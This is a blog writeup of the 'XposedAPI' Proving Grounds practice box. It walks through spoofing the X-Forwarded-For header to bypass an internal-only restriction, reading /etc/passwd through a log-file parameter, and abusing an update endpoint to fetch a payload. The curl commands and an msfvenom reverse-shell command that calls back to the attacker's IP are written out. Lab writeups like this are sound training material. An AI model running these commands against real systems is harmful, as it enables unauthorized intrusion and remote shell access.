---
layout: writeup
title: XposedAPI - Proving Grounds
date: 2024-07-27 13:32:20 +0300
description: A Writeup of the XposedAPI Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi]
---

![XposedAPI1.png](/assets/images/XposedAPI/XposedAP1.png){: .responsive-image}

Here's a writeup for XposedAPI, an Intermediate Proving Grounds box from the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). While this box has been rated Intermediate by OffSec, I'll note that the community has rated it to be Hard. I get started with an nmap scan to reveal:

```
PORT      STATE SERVICE
22/tcp    open  ssh
13337/tcp open  unknown
```

So we have two open ports, one for SSH and one for presumably an API service based on the name of the box. When we visit the port in the browser, we get this page:

![XposedAPI2.png](/assets/images/XposedAPI/XposedAPI2.png){: .responsive-image}

It seems to detail the types of API requests which are accepted by the server. We can make a GET request on `/, /version, /logs,` and `/restart` and a POST request on `/update`. We know that this page is the result of making a GET request to `/`, because it's `http://192.168.245.134:13337/`. When we do the same for `/version` in `curl` we get this response: `1.0.0b8f887f33975ead915f336f57f0657180`. Not a lot of information there, but maybe we can find an exploit or something. The result for logs says `WAF: Access Denied for this Host.` Too bad, it looks like we need a user for the POST request on `/update`. Trying a GET request for `/restart` shows this:

![XposedAPI3.png](/assets/images/XposedAPI/XposedAPI3.png){: .responsive-image}

Using this curl request: `curl -X POST -d '{"confirm":"true"}' http://192.168.245.134:13337/restart`, gives us a response of `Restart successful` but doesn't seem to change anything else on the other endpoints. Next we try a POST request to `/update` using this curl command:

`curl -H 'Content-Type: application/json' -d '{"user":"test", "url":"192.168.45.183/test.txt"}' -X POST http://192.168.245.134:13337/update`

This returns `Invalid username`. I try a few different common options, but I figure I can't do much here until I have a username, which I can't get from logs. I try to look for an existing exploit, but searching for "Remote Service Software" or "Remote Software Management API" only returns writeups for this very lab, as does searching the given version. 

At this point I attempted to brute force looking for usernames in Burp Repeater, but I got nowhere. Then I learned we can actually spoof where the request is coming from using a header called: `X-Forwarded-For`. Because the web page says that the API should only be exposed internally, we can assume that if we tell the server it came from localhost, we might actually be able to read the `/logs` page. 

We can craft such a curl request like this: `curl -X GET -H 'X-Forwarded-For: 127.0.0.1' http://192.168.245.134:13337/logs`, but it returns: `Error! No file specified. Use file=/path/to/log/file to access log files.`

So we add the file as a parameter like this: `curl -X GET -H 'X-Forwarded-For: 127.0.0.1' http://192.168.245.134:13337/logs?file=/etc/passwd` and we get a response. 

![XposedAPI4.png](/assets/images/XposedAPI/XposedAPI4.png){: .responsive-image}

At that point I take note that we have a user called `clumsyadmin` which we had been looking for before in the logs. I look around briefly for an SSH key or something like that, but I find nothing, and given that we only have two ports to work with anyway, I move back to the API. I run this curl command: `curl -X POST -H 'Content-Type: application/json' -d '{"user":"clumsyadmin", "url":"192.168.45.183/test.txt"}' http://192.168.245.134:13337/update` and get a response that says: `Update requested by clumsyadmin. Restart the software for changes to take effect.`. I restart using the previous steps, and then the test file downloads from my server. 

I generate a reverse shell using `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.183 LPORT=80 -f elf -o reverse.elf`, because I already know that the target can access port 80 having downloaded the test file previously. Then I open a shell on port 80, and I restart the server. 

![XposedAPI5.png](/assets/images/XposedAPI/XposedAPI5.png){: .responsive-image}

And we have a shell. I check what we can run with sudo (nothing cause we don't have the password) and for any SUID binaries. Immediately `wget` sticks out, so I check [GTFObins](https://gtfobins.github.io/gtfobins/wget/#suid) and I run the commands for wget:

![XposedAPI6.png](/assets/images/XposedAPI/XposedAPI6.png){: .responsive-image}

And boom, we have root. 

Lessons learned: I did not know about the `X-Forwarded-For` header. Beyond that it was mostly practice with curl command syntax. The privesc was straightforward and took very little time. 